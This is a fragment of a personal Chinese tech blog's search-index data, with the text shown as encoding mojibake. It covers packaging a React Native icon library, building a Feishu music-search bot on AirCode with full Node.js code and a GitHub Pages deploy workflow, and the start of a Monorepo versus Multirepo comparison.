123456&#123; &quot;symbol_url&quot;: &quot;//at.alicdn.com/t/font_2952809_4bb6cudcj1k.js&quot;, &quot;use_typescript&quot;: true, &quot;save_dir&quot;: &quot;./src&quot;, &quot;default_icon_size&quot;: 18&#125; å‘ç‰ˆå›¾æ ‡çš„ç®¡ç†å’Œç”Ÿæˆéƒ½è¯´å®Œäº†ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åˆ°è¿™é‡Œå°±è¯¥ç»“æŸäº†ï¼Œä½†æ˜¯æˆ‘çš„ç»„ä»¶åº“ä¸­å›¾æ ‡æ˜¯å•ç‹¬æŠ½å‡ºæ¥çš„ä¸€ä¸ªåŒ…ï¼Œè¿™é‡Œè¿˜éœ€è¦è¯´ä¸‹ç»„ä»¶çš„æ‰“åŒ…å’Œå‘ç‰ˆé—®é¢˜ã€‚ æ‰“åŒ…çš„è¯åœ¨ä¸Šä¸€ç¯‡æ–‡ç«  - React Native ç»„ä»¶åº“ - è„šæ‰‹æ¶ é‡Œä»‹ç»äº† React Native çš„ä¸€ä¸ªä¼˜ç§€çš„æ‰“åŒ…å·¥å…· react-native-builder-bobï¼Œè¿™é‡Œæˆ‘ä»¬å›¾æ ‡ç»„ä»¶ä¾ç„¶ä½¿ç”¨å®ƒæ¥æ‰“åŒ…ï¼Œå¦‚ä½•ä½¿ç”¨å¯ä»¥å‚è€ƒæˆ‘ä¸Šä¸€ç¯‡æ–‡ç« æˆ–è€…ç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œè¿™é‡Œè´´ä¸‹æœ€åä½¿ç”¨çš„å®Œæ•´é…ç½®ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&#123; &quot;name&quot;: &quot;@rn-vant/icons&quot;, &quot;version&quot;: &quot;0.2.0&quot;, &quot;description&quot;: &quot;rn-vant icons for react-native&quot;, &quot;keywords&quot;: [&quot;react-native&quot;, &quot;rn-vant&quot;, &quot;icon&quot;], &quot;author&quot;: &quot;bijinfeng &lt;bijinfeng@bytedance.com&gt;&quot;, &quot;license&quot;: &quot;MIT&quot;, &quot;main&quot;: &quot;lib/commonjs/index&quot;, &quot;module&quot;: &quot;lib/module/index&quot;, &quot;types&quot;: &quot;lib/typescript/index.d.ts&quot;, &quot;react-native&quot;: &quot;src/index&quot;, &quot;source&quot;: &quot;src/index&quot;, &quot;directories&quot;: &#123; &quot;lib&quot;: &quot;lib&quot;, &quot;test&quot;: &quot;__tests__&quot; &#125;, &quot;files&quot;: [&quot;lib&quot;, &quot;src&quot;], &quot;publishConfig&quot;: &#123; &quot;access&quot;: &quot;public&quot; &#125;, &quot;scripts&quot;: &#123; &quot;generate&quot;: &quot;npx iconfont-rn&quot;, &quot;build&quot;: &quot;bob build&quot; &#125;, &quot;devDependencies&quot;: &#123; &quot;react-native-builder-bob&quot;: &quot;^0.18.2&quot;, &quot;react-native-iconfont-cli&quot;: &quot;^2.2.3&quot;, &quot;react-native-svg&quot;: &quot;^12.4.4&quot;, &quot;typescript&quot;: &quot;^4.4.3&quot; &#125;, &quot;peerDependencies&quot;: &#123; &quot;react&quot;: &quot;*&quot;, &quot;react-native&quot;: &quot;*&quot;, &quot;react-native-svg&quot;: &quot;*&quot; &#125;, &quot;react-native-builder-bob&quot;: &#123; &quot;source&quot;: &quot;src&quot;, &quot;output&quot;: &quot;lib&quot;, &quot;targets&quot;: [ &quot;commonjs&quot;, &quot;module&quot;, [ &quot;typescript&quot;, &#123; &quot;project&quot;: &quot;tsconfig.build.json&quot; &#125; ] ] &#125;&#125; å‘å¸ƒåˆ° npm å°±ä¸è¿‡å¤šä»‹ç»ï¼Œè€ç”Ÿå¸¸è°ˆçš„é—®é¢˜äº†ï¼Œä¸€èˆ¬ Mono Repo é¡¹ç›®é‡Œéƒ½æœ‰è‡ªå·±çš„å‘å¸ƒå‘½ä»¤ï¼Œæ¯”å¦‚ï¼Œlerna é¡¹ç›®å°±ç”¨ lerna publishï¼Œä¸€èˆ¬ Multi Repo é¡¹ç›®ä½¿ç”¨ npm publishå°±å¯ä»¥äº†ã€‚å¦‚æœä¸æƒ³æ‰‹åŠ¨å‘å¸ƒï¼Œå¯ä»¥å€ŸåŠ© CI&#x2F;CD å·¥å…·åšåˆ°è‡ªåŠ¨å‘å¸ƒï¼Œè¿™äº›ä¸åœ¨æœ¬æ–‡è®¨è®ºèŒƒå›´å†…ï¼Œå°±ä¸å¤šèµ˜è¿°äº†ã€‚ æ€»ç»“å¾—ç›Šäºå‰ç«¯å¼ºå¤§çš„ç¤¾åŒºï¼Œåœ¨ React Native ä¸­ä½¿ç”¨ SVG å›¾æ ‡å¹¶ä¸æ˜¯ä¸€ä»¶å¤šä¹ˆéº»çƒ¦çš„äº‹æƒ…ï¼Œå€ŸåŠ©ä¸€äº›å·¥å…·ï¼Œç”šè‡³èƒ½åšåˆ°å¼€å‘ä½“éªŒä¸æ»‘åˆ°é£èµ·ã€‚æœ‰æ—¶ä¸å¾—ä¸æ„Ÿå¹ä¸€å¥å‰ç«¯å‘å±•å¤ªå¿«äº†ï¼Œæ—©å·²è„±ç¦»äº†åˆ€è€•ç«ç§çš„æ—¶ä»£ï¼Œå„ç§å…ˆè¿›çš„å·¥å…·ä¸æ–­æ¶Œç°ï¼Œç›®ä¸æš‡æ¥ï¼Œç°åœ¨æœ€å¤§çš„é—®é¢˜åè€Œæ˜¯å·¥å…·å¤ªå¤šï¼Œå­¦ä¸è¿‡æ¥çš„é—®é¢˜ï¼","tags":["React","React Native"],"categories":["React Native","ç»„ä»¶åº“"]},{"title":"ä½¿ç”¨ AirCode å¼€å‘é£ä¹¦æœºå™¨äºº","path":"/2023/02/14/7a3b3abbe76f/","content":"åœ¨çº¿æ–‡æ¡£ï¼šhttps://docs-cn.aircode.io/ AirCode æ˜¯ä¸€ä¸ªåœ¨çº¿å¼€å‘å’Œéƒ¨ç½² Node.js åº”ç”¨çš„å¹³å°ï¼Œä¸ºå…¨æ ˆå·¥ç¨‹å¸ˆé‡èº«å®šåˆ¶ï¼Œç›®æ ‡æ˜¯è®©å¼€å‘å˜å¾—ç®€å•ã€‚ å¹¶ä¸”æä¾›ä¸€ä¸ªç®€æ˜“çš„ WebIDE å’Œå¼€ç®±å³ç”¨çš„äº‘æœåŠ¡ï¼Œè®©å¼€å‘è€…æ— éœ€å†æ“å¿ƒåç«¯é€‰å‹ã€ç¯å¢ƒæ­å»ºå’Œçº¿ä¸Šè¿ç»´ç­‰ä¸€ç³»åˆ—ç¹çä¹‹äº‹ï¼Œåªéœ€æ‰“å¼€æµè§ˆå™¨å³å¯å®Œæˆäº§å“å¼€å‘ï¼Œå¹¶éƒ¨ç½²åˆ°å…¨çƒèŠ‚ç‚¹ã€‚ ä½†æ˜¯ AirCode æœ‰èµ„æºé™åˆ¶ï¼Œä¸å»ºè®®ç”¨äºé«˜é¢‘çš„æœåŠ¡ï¼Œä½†æ˜¯æˆ‘ä»¬è¦å¼€å‘çš„æœºå™¨äººæ¥å£è°ƒç”¨é¢‘ç‡ä¸ä¼šç‰¹åˆ«é«˜ï¼Œå› æ­¤æ­£é€‚åˆ AirCodeã€‚ æ•ˆæœ @æœºå™¨äºº å‘Šè¯‰å®ƒä½ æƒ³å¬çš„æ­Œæ›²åå­—ï¼Œæœºå™¨äººä¼šè¿”å›ç»™ä½ æœ€åŒ¹é…çš„ä¸‰æ¡ï¼Œç‚¹å‡»ã€Œæ‰“å¼€æ’­æ”¾å™¨ã€ï¼Œä¼šåœ¨å³ä¾§å¼¹å‡ºåœ¨çº¿æ’­æ”¾å™¨ã€‚ éŸ³ä¹æ’­æ”¾å™¨æ’­æ”¾å™¨ä½¿ç”¨ Github ä¸Šçš„å¼€æºé¡¹ç›®ã€Œmusic-motion-xã€ï¼Œè¯¥é¡¹ç›®æ˜¯ SSR æœåŠ¡ç«¯æ¸²æŸ“é¡¹ç›®ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦éƒ¨ç½²åˆ° Github Pages ä¸Šï¼Œå› æ­¤éœ€è¦ä¸€äº›æ”¹é€ ã€‚ ä½¿ç”¨ Vite æ–°å»ºä¸ª react + ts çš„æ¨¡æ¿ï¼š 1yarn create vite my-vue-app --template react-ts æ¥ä¸‹æ¥å®‰è£…å¹¶é…ç½® eslintã€commitlintã€huskyå’Œlint-stagedç­‰å·¥å…·ï¼Œé…ç½®ç»†èŠ‚æœ¬æ–‡å°±ä¸èµ˜è¿°äº†ï¼Œè¯¦ç»†é…ç½®è§ https://github.com/bijinfeng/music-motion-x è¿ç§»ä»£ç è‡³æ–°é¡¹ç›®ä¸­ æ·»åŠ  Github Action 12345678910111213141516171819202122232425262728name: Build and Deployon: push: branches: - masterjobs: build-and-deploy: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@master with: submodules: true - name: Install Dependencies run: yarn install - name: Generate run: yarn build - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125; publish_dir: ./dist æäº¤ä»£ç è‡³ Github å°±å¯ä»¥è§¦å‘è‡ªåŠ¨éƒ¨ç½²äº† æ–°å»ºé£ä¹¦åº”ç”¨åœ¨é£ä¹¦å¼€æ”¾å¹³å°æ–°å»ºä¸ªåº”ç”¨ï¼Œå›¾æ ‡å’Œåç§°è‡ªå®šä¹‰ï¼Œæ·»åŠ åº”ç”¨åæ·»åŠ ã€Œç½‘é¡µã€å’Œã€Œæœºå™¨äººã€åº”ç”¨ï¼šç½‘é¡µåº”ç”¨å°†ä¸»é¡µåœ°å€é…ç½®æˆ Github Page çš„åœ°å€æœºå™¨äººåº”ç”¨éœ€è¦é…ç½®ä¸ªæ¶ˆæ¯è¯·æ±‚åœ°å€ï¼Œå¯ä»¥å…ˆä¸å¡«ï¼Œç­‰åˆ° AirCode å¼€å‘å®Œæˆåå›å¤´å†æ¥å¡«ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¿˜éœ€è¦ç”³è¯·æƒé™å’Œè®¢é˜…äº‹ä»¶ï¼Œç”¨äºæœºå™¨äººæ¶ˆæ¯çš„æ”¶å‘ï¼š è®¢é˜…äº‹ä»¶ï¼šåªéœ€è¦ã€Œæ¥æ”¶æ¶ˆæ¯ã€çš„äº‹ä»¶å°±è¡Œï¼Œè¯·æ±‚åœ°å€é…ç½®æˆä¸Šé¢ ğŸ‘† æœºå™¨äººè¯·æ±‚åœ°å€ ç”³è¯·æƒé™ï¼šä»¥ä¸‹æƒé™æ˜¯å¿…é¡»è¦æœ‰çš„ï¼Œå…¶å®ƒæƒé™æŒ‰éœ€ç”³è¯· æœºå™¨äºº webhook æ¥å£å¼€å‘ä¸Šé¢åº”ç”¨å’Œæœºå™¨äººé…ç½®å¥½åï¼Œæ¥ä¸‹æ¥å°±éœ€è¦å¼€å‘ webhook æ¥å£ä¾›æœºå™¨äººè®¢é˜…ã€‚ é¦–å…ˆéœ€è¦æ–°å»ºä¸ªåº”ç”¨ï¼Œç„¶åå®‰è£…ä¸¤ä¸ªä¾èµ–ï¼š axios - å‘é€ http è¯·æ±‚ @larksuiteoapi&#x2F;node-sdk - é£ä¹¦å¼€æ”¾æ¥å£ SDK æ–°å»º client.js æ–‡ä»¶ 1234567const lark = require(&quot;@larksuiteoapi/node-sdk&quot;);module.exports = new lark.Client(&#123; appId: process.env.app_id, appSecret: process.env.app_secret, appType: lark.AppType.SelfBuild,&#125;); app_id å’Œ app_secretè¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡ä»é£ä¹¦å¼€æ”¾å¹³å°è·å–åï¼Œé…ç½®åˆ° AirCode çš„ Enviroments Tab ä¸‹ï¼š æ–°å»º image.js æ–‡ä»¶ é£ä¹¦çš„æ¶ˆæ¯å¡ç‰‡è¦æ’å…¥å›¾ç‰‡ï¼Œå¿…é¡»è¦å…ˆå°†å›¾ç‰‡ä¸Šä¼ åˆ°é£ä¹¦ä¸­æ‰è¡Œï¼Œå› æ­¤è¯¥æ–‡ä»¶çš„ä½œç”¨æ˜¯å°†ç½‘ç»œå›¾ç‰‡ä¸Šä¼ åˆ°é£ä¹¦ä¸­ï¼Œå¹¶è¿”å›å›¾ç‰‡çš„ image_keyã€‚ 123456789101112131415161718192021222324252627282930313233343536373839const aircode = require(&quot;aircode&quot;);const axios = require(&quot;axios&quot;);const querystring = require(&quot;querystring&quot;);const client = require(&quot;./client&quot;);module.exports = async (&#123; url &#125;) =&gt; &#123; // å¦‚æœå·²ç»ä¸Šä¼ è¿‡äº†ï¼Œä»æ•°æ®åº“ä¸­å–å‡ºç¼“å­˜ const ImagesTable = aircode.db.table(&quot;images&quot;); // æŸ¥è¯¢æ•°æ®åº“ const result = await ImagesTable.where(&#123; url &#125;).find(); if (result.length &gt; 0) &#123; return result[0].imageKey; &#125; // æ·»åŠ  param=200y200 çš„å‚æ•°ï¼Œä½¿ç”¨å°å°ºå¯¸å›¾ç‰‡ const splitUrl = url.split(&quot;?&quot;); const querys = querystring.parse(splitUrl[1] || &quot;&quot;); const queryString = querystring.stringify(&#123; ...querys, param: &quot;200y200&quot; &#125;); const newUrl = `$&#123;splitUrl[0]&#125;?$&#123;queryString&#125;`; // ä¸Šä¼ å›¾ç‰‡åˆ°é£ä¹¦ä¸­ const response = await axios.get(newUrl, &#123; responseType: &quot;arraybuffer&quot; &#125;); const &#123; image_key &#125; = await client.im.image.create(&#123; data: &#123; image_type: &quot;message&quot;, image: Buffer.from(response.data, &quot;utf-8&quot;), &#125;, &#125;); // ä¿å­˜åˆ°æ•°æ®åº“ä¸­ ImagesTable.save(&#123; url: newUrl, imageKey: image_key, &#125;); return image_key;&#125;; æ–°å»º search.js æ–‡ä»¶ ä½¿ç”¨ç½‘æ˜“äº‘éŸ³ä¹çš„æœç´¢æ¥å£æ ¹æ®å…³é”®è¯æœç´¢éŸ³ä¹ï¼Œå¯ä»¥æ ¹æ®è¯¥æ–‡æ¡£è‡ªå»º APIï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°äº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445const axios = require(&quot;axios&quot;);const imageUpload = require(&quot;./image&quot;);const request = axios.create(&#123; baseURL: process.env.music_api,&#125;);// æœç´¢æ­Œæ›²module.exports = async function (params) &#123; const &#123; keyword &#125; = params; const result = await request.get(`/search?keywords=$&#123;keyword&#125;&amp;type=1018`); // å–å‰ä¸‰é¦– const songs = result.data.result.song.songs.slice(0, 3); const _list = await songs.map((data) =&gt; &#123; const artistNames = data.ar.length ? [...data.ar] .reverse() .reduce((ac, a) =&gt; `$&#123;a.name&#125; $&#123;ac&#125;`, &quot;&quot;) .trim() : &quot;&quot;; return &#123; imgUrl: data.al.picUrl, title: `$&#123;data.name&#125;`, desc: `$&#123;artistNames&#125; Â· $&#123;data.al.name&#125;`, artistId: data.ar[0].id, albumId: data.al.id, artistName: artistNames, albumName: data.al.name, id: data.id, &#125;; &#125;); const imageKeys = await Promise.all( _list.map((data) =&gt; imageUpload(&#123; url: data.imgUrl &#125;)) ); const list = _list.map((data, index) =&gt; (&#123; ...data, imageKey: imageKeys[index], &#125;)); return list;&#125;; æ–°å»º reaction.js æ–‡ä»¶ è¯¥æ–‡ä»¶å°±æ˜¯ç”¨æ¥ç”Ÿæˆæ¶ˆæ¯å¡ç‰‡å¯Œæ–‡æœ¬ï¼Œå¯Œæ–‡æœ¬ JSON å¯ä»¥å…ˆåœ¨é£ä¹¦çš„æ¶ˆæ¯å¡ç‰‡æ­å»ºå·¥å…·æ­å»ºå¥½ï¼Œå†å¤åˆ¶åˆ°è¯¥æ–‡ä»¶ä¸­ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// ç”Ÿæˆæ¶ˆæ¯å¡ç‰‡const generatePath = (id) =&gt; &#123; return `https://applink.feishu.cn/client/web_app/open?appId=$&#123;process.env.app_id&#125;&amp;mode=sidebar&amp;id=$&#123;id&#125;`;&#125;;const generateHeader = (keyword) =&gt; &#123; return &#123; template: &quot;turquoise&quot;, title: &#123; content: `ğŸµ $&#123;keyword&#125;`, tag: &quot;plain_text&quot;, &#125;, &#125;;&#125;;const generateCard = (data) =&gt; &#123; return &#123; tag: &quot;div&quot;, text: &#123; tag: &quot;lark_md&quot;, content: `**$&#123;data.title&#125;** $&#123;data.desc&#125; [æ‰“å¼€æ’­æ”¾å™¨]($&#123;generatePath( data.id )&#125;)`, &#125;, extra: &#123; tag: &quot;img&quot;, img_key: data.imageKey, alt: &#123; tag: &quot;plain_text&quot;, content: data.title, &#125;, &#125;, &#125;;&#125;;module.exports = (&#123; keyword, list &#125;) =&gt; &#123; console.log(&quot;search keyword: &quot;, keyword); console.log(&quot;search result: &quot;, list); const header = generateHeader(keyword); const elements = list.reduce((result, item, index) =&gt; &#123; const card = generateCard(item); if (index &gt; 0) &#123; result.push(&#123; tag: &quot;hr&quot; &#125;); &#125; return [...result, card]; &#125;, []); return &#123; config: &#123; wide_screen_mode: true, &#125;, elements, header, &#125;;&#125;; æ–°å»º index.js æ–‡ä»¶ æœ€åå†æ–°å»ºä¸ªå…¥å£æ–‡ä»¶ï¼Œé›†æˆä¸‹å‰é¢çš„å‡ ä¸ªæ¨¡å—ï¼š é¦–å…ˆé£ä¹¦å¼€æ”¾å¹³å°ä¼šå‘æ¥å£å‘é€ä¸ªéªŒè¯è¯·æ±‚ï¼Œè¯·æ±‚ä¸º JSON æ ¼å¼ï¼Œå¸¦ challenge å‚æ•°ã€‚åº”ç”¨æ¥æ”¶æ­¤è¯·æ±‚åï¼Œéœ€è§£æå‡º challenge å€¼ï¼Œå¹¶åœ¨ 1 ç§’å†…å›å¤ challenge å€¼ã€‚å¯ä»¥é€šè¿‡ params.type &#x3D;&#x3D;&#x3D; â€˜url_verificationâ€™ æ¥åˆ¤æ–­è¯·æ±‚æ˜¯å¦æ˜¯éªŒè¯è¯·æ±‚ã€‚ é€šè¿‡ register æ–¹æ³•æ³¨å†Œäº‹ä»¶çš„å›è°ƒï¼Œç›®å‰æˆ‘ä»¬åªè®¢é˜…äº† im.message.receive_v1è¿™ä¸€ä¸ªäº‹ä»¶ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// @see https://docs.aircode.io/guide/functions/const aircode = require(&quot;aircode&quot;);const lark = require(&quot;@larksuiteoapi/node-sdk&quot;);const client = require(&quot;./client&quot;);const search = require(&quot;./search&quot;);const reaction = require(&quot;./reaction&quot;);const sendMessage = (chatId, content, type = &quot;text&quot;) =&gt; &#123; return client.im.message.create(&#123; params: &#123; receive_id_type: &quot;chat_id&quot;, &#125;, data: &#123; receive_id: chatId, content: JSON.stringify(content), msg_type: type, &#125;, &#125;);&#125;;const eventDispatcher = new lark.EventDispatcher(&#123;&#125;).register(&#123; &quot;im.message.receive_v1&quot;: async (data) =&gt; &#123; const open_chat_id = data.message.chat_id; const msg = JSON.parse(data.message.content).text; const keyword = msg.replace(/^@\\w+/, &quot;&quot;).trim(); let res; if (!keyword) &#123; res = await sendMessage(open_chat_id, &#123; text: &quot;è¯·å‘Šè¯‰æˆ‘ä¸€äº›å…³é”®è¯ï¼Œæ¯”å¦‚æ­Œåï¼Œæ­Œæ‰‹åï¼Œæ­Œå•åï¼Œç”¨æˆ·åç­‰~&quot;, &#125;); &#125; else &#123; const list = await search(&#123; keyword &#125;); const interactive = reaction(&#123; keyword, list &#125;); res = await sendMessage(open_chat_id, interactive, &quot;interactive&quot;); &#125; return res; &#125;,&#125;);module.exports = async function (params, context) &#123; console.log(&quot;Received params:&quot;, params); // url éªŒè¯ if (params.type === &quot;url_verification&quot;) &#123; return &#123; challenge: params.challenge &#125;; &#125; // æ ¹æ® message_id å»é‡å¤æ¶ˆæ¯ const message_id = params.event.message.message_id; const LogsTable = aircode.db.table(&quot;logs&quot;); const findResult = await LogsTable.where(&#123; message_id &#125;).find(); if (findResult.length &gt; 0) return `é‡å¤æ¶ˆæ¯ - $&#123;message_id&#125;`; LogsTable.save(&#123; message_id &#125;); return await eventDispatcher.invoke(params);&#125;; ç‚¹å‡» DeployæŒ‰é’®ï¼Œå‘å¸ƒæ‰€æœ‰å‡½æ•°ï¼Œå¤åˆ¶ index.js çš„å…¬ç½‘è¯·æ±‚è·¯å¾„åˆ°é£ä¹¦åº”ç”¨è®¾ç½®ä¸­ æ€»ç»“AirCode ç”¨æ¥å¼€å‘æœºå™¨äººç›¸å½“æ–¹é¢ï¼Œæ›¿æˆ‘ä»¬çœæ‰äº†æ•°æ®åº“ï¼Œæ–‡ä»¶æœåŠ¡ï¼Œçº¿ä¸Šè¿ç»´ç­‰ä¸€ç³»ç±»ç¹ççš„äº‹æƒ…ï¼Œä½¿ç”¨ä¸€ä¸ªæµè§ˆå™¨å°±èƒ½å¿«é€Ÿçš„å¼€å‘ä¸Šçº¿ã€‚å†æ­é…ä¸Š Github Page å°±èƒ½ç™½å«–åˆ°åº•ã€‚","tags":["React","AirCode"],"categories":["tools"]},{"title":"React Native ç»„ä»¶åº“ - è„šæ‰‹æ¶","path":"/2023/02/06/8f5436bb4e35/","content":"ä½œä¸ºä¸€ä¸ªå‰ç«¯ erï¼Œè°ä¸æƒ³æ‹¥æœ‰ä¸€ä¸ªè‡ªå·±çš„ç»„ä»¶åº“ã€‚æˆ‘ä¹Ÿæƒ³ï¼Œæ‰€ä»¥å®ƒæ¥äº† - rn-vantï¼Œä½¿ç”¨ vant è®¾è®¡è§„èŒƒçš„ React Native ç»„ä»¶åº“ã€‚ ç»„ä»¶åº“ç›®å‰å·²ç»æ‹¥æœ‰äº† 40+ ç»„ä»¶ï¼ˆè™½ç„¶è¿˜æ˜¯å¾ˆç®€é™‹ï¼Œbug ä¹Ÿæ˜¯ä¸€å †ï¼Œä¸»è¦è¿˜æ˜¯æˆ‘å¤ªæ‡’äº† ğŸ˜…ï¼‰ï¼Œä¹Ÿç®—åœ†äº†æˆ‘çš„ä¸€ä¸ªæ¢¦æƒ³ï¼Œç°åœ¨æ˜¯æ—¶å€™åšä¸ªé˜¶æ®µæ€»ç»“äº†ï¼Œå°†è¿™æ®µæ—¶é—´å¼€å‘é‡åˆ°çš„é—®é¢˜éƒ½è®°å½•ä¸‹æ¥ï¼Œä¸€æ–¹é¢æ˜¯æ€•è‡ªå·±å¿˜äº†ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿæ˜¯ç»™çœ‹åˆ°è¿™ç³»åˆ—æ–‡ä»¶çš„æœ‹å‹åšä¸ªå‚è€ƒã€‚ Mono or Multi Repo from https://juejin.cn/post/6949882490324516894#heading-9 è¿™é‡Œç®€å•è§£é‡Šä¸‹ä»€ä¹ˆæ˜¯ MonoRepo ä»¥åŠ MultiRepoï¼Œä»¥åŠä»–ä»¬çš„ä¼˜ç¼ºç‚¹ï¼š MonoRepoï¼šæŠŠå¤šä¸ªé¡¹ç›®æ”¾åœ¨ä¸€ä¸ªä»“åº“é‡Œé¢ç®¡ç†ã€‚ MultiRepoï¼šæ¯ä¸ªé¡¹ç›®éƒ½å¯¹åº”ç€ä¸€ä¸ªå•ç‹¬çš„ä»£ç ä»“åº“æ¯ä¸ªé¡¹ç›®è¿›è¡Œåˆ†æ•£ç®¡ç†ã€‚ MonoRepo ä¼˜ç¼ºç‚¹ï¼š ä¼˜ç‚¹ï¼š ç»Ÿä¸€äº†å·¥ä½œæµï¼šç”±äºæ‰€æœ‰çš„é¡¹ç›®æ”¾åœ¨ä¸€ä¸ªä»“åº“å½“ä¸­ï¼Œå¤ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ï¼Œå¦‚æœæœ‰ä¾èµ–çš„ä»£ç å˜åŠ¨ï¼Œé‚£ä¹ˆç”¨åˆ°è¿™ä¸ªä¾èµ–çš„é¡¹ç›®å½“ä¸­ä¼šç«‹é©¬æ„ŸçŸ¥åˆ° é™ä½åŸºå»ºæˆæœ¬ï¼šæ‰€æœ‰é¡¹ç›®å¤ç”¨ä¸€å¥—æ ‡å‡†çš„å·¥å…·å’Œè§„èŒƒï¼Œæ— éœ€åˆ‡æ¢å¼€å‘ç¯å¢ƒï¼Œå¦‚æœæœ‰æ–°çš„é¡¹ç›®æ¥å…¥ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å¤ç”¨å·²æœ‰çš„åŸºå»ºæµç¨‹ï¼Œæ¯”å¦‚ CI æµç¨‹ã€æ„å»ºå’Œå‘å¸ƒæµç¨‹ã€‚ æå‡å›¢é˜Ÿåä½œæ•ˆç‡ï¼šä¸€æ–¹é¢å¤§å®¶éƒ½åœ¨ä¸€ä¸ªä»“åº“å¼€å‘ï¼Œèƒ½å¤Ÿæ–¹ä¾¿åœ°å…±äº«å’Œå¤ç”¨ä»£ç ï¼Œæ–¹ä¾¿æ£€ç´¢é¡¹ç›®æºç ï¼Œå¦ä¸€æ–¹é¢ï¼Œgit commit çš„å†å²è®°å½•ä¹Ÿæ”¯æŒä»¥åŠŸèƒ½ä¸ºå•ä½è¿›è¡Œæäº¤ï¼Œä¹‹å‰å¯¹äºæŸä¸ªåŠŸèƒ½çš„æäº¤ï¼Œéœ€è¦æ”¹å¥½å‡ ä¸ªä»“åº“ï¼Œæäº¤å¤šä¸ª commitï¼Œç°åœ¨åªéœ€è¦æäº¤ä¸€æ¬¡ï¼Œç®€åŒ–äº† commit è®°å½•ï¼Œæ–¹ä¾¿åä½œã€‚ ç¼ºç‚¹ï¼š ä½“ç§¯é—®é¢˜ï¼šå› ä¸ºæ‰€æœ‰ code éƒ½åœ¨ä¸€ä¸ª repo ä¸‹ï¼Œè¿™å°±å¯¼è‡´äº†éšç€é¡¹ç›®è¶Šæ¥è¶Šå¤æ‚ï¼Œæ•´ä¸ª repo çš„ä½“ç§¯ä¼šå˜å¾—å¾ˆå¤§ã€‚æ®è¯´æŸå¤§å…¬å¸å‘˜å·¥æƒ³è¦ä¿®æ”¹é¡¹ç›®ä¸­çš„æŸä¸ªå°æ ·å¼ï¼Œéœ€è¦å°†æ•°ä»¥å G çš„ repo æ‹‰åˆ°æœ¬åœ°ï¼Œå¬èµ·æ¥ç¡®å®æ˜¯ä¸ªå™©æ¢¦ã€‚ æƒé™é—®é¢˜ï¼šMonorepo æ¨¡å¼ä¸‹çš„æƒé™æ˜¯å¼€æ”¾çš„ã€‚ä»£ç å®‰å…¨ï¼Œæ–‡æ¡£å®‰å…¨ï¼Œéƒ½ä¼šæ˜¯ä¸€ä¸ªéœ€è¦å¥½å¥½è€ƒè™‘çš„é—®é¢˜ã€‚è¿™ä¸ªæ–¹é¢å¦‚æœå¤„ç†ä¸å¥½çš„è¯ï¼Œå¯¹æ•´ä¸ªå›¢é˜Ÿæ•´ä¸ªé¡¹ç›®å¸¦æ¥çš„åæœå¯èƒ½æ˜¯ç¾éš¾æ€§çš„ã€‚ ç‰ˆæœ¬æ§åˆ¶ï¼šä»“åº“å˜å¾—å¤ªå¤§ï¼Œå¯¹ç‰ˆæœ¬æ§åˆ¶æŠ€æœ¯ä¼šæœ‰å¾ˆå¤§çš„æŒ‘æˆ˜ã€‚å› ä¸º Git ç¤¾åŒºå»ºè®®çš„æ˜¯ä½¿ç”¨æ›´å¤šæ›´å°çš„ä»£ç åº“ï¼ŒGit æœ¬èº«å¹¶ä¸é€‚åˆå•ä¸ªå·¨å¤§çš„ä»£ç åº“ã€‚ Monorepo å’Œ Multirepo éƒ½æ˜¯ç®¡ç†ç»„ç»‡ä»£ç çš„æ–¹å¼ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆä¼˜åŠ£ä¹‹åˆ†ï¼Œè¿˜æ˜¯é‚£å¥è¯â€œå­˜åœ¨å³åˆç†â€ï¼Œå·¥å…·éƒ½æ˜¯ç”¨æ¥æœåŠ¡ç”Ÿäº§çš„ï¼Œèƒ½æ›´æœ‰æ•ˆè§£å†³å½“ä¸‹é—®é¢˜çš„ï¼Œå°±æ˜¯æ›´å¥½çš„ã€‚å›åˆ°ç»„ä»¶åº“ä¸Šï¼ŒæŒ‰ç…§æœ€åˆçš„è§„åˆ’ï¼Œç»„ä»¶åº“æœ€å°‘ä¼šäº§å‡ºä¸¤ä¸ª npm åŒ…ï¼Œç»„ä»¶åº“æœ¬ä½“å’Œ icon ç»„ä»¶ï¼Œå¹¶ä¸”ç»„ä»¶åº“ä¼šä¾èµ– icon ç»„ä»¶ï¼Œè‡ªç„¶é‡‡ç”¨ Monorepo çš„æ–¹å¼æ˜¯æœ€å¥½çš„ã€‚ Monorepo å·¥å…·æ—¢ç„¶é€‰æ‹©äº† Monorepoï¼Œè‡ªç„¶å°±éœ€è¦çœ‹çœ‹ç¤¾åŒºé‡Œæœ‰å“ªäº›å¥½çš„ Monorepo å·¥å…·ï¼š Bitï¼šç”¨äºç»„ä»¶é©±åŠ¨å¼€å‘çš„å·¥å…·é“¾ Turborepoï¼šç”¨äº JavaScript å’Œ TypeScript ä»£ç åº“çš„é«˜æ€§èƒ½æ„å»ºç³»ç»Ÿã€‚ Rushï¼šä¸€ä¸ªå¯æ‰©å±•çš„ web å•ä»“åº“ç®¡ç†å™¨ã€‚ Nxï¼šå…·æœ‰ä¸€æµçš„ monorepo æ”¯æŒå’Œå¼ºå¤§é›†æˆçš„ä¸‹ä¸€ä»£æ„å»ºç³»ç»Ÿã€‚ Lernaï¼šç”¨äºç®¡ç†åŒ…å«å¤šä¸ªè½¯ä»¶åŒ…çš„é¡¹ç›® ä¸Šé¢è¿™äº›å·¥å…·ä¸­ï¼Œæˆ‘æœ€ç†Ÿæ‚‰çš„å°±æ˜¯ Lerna 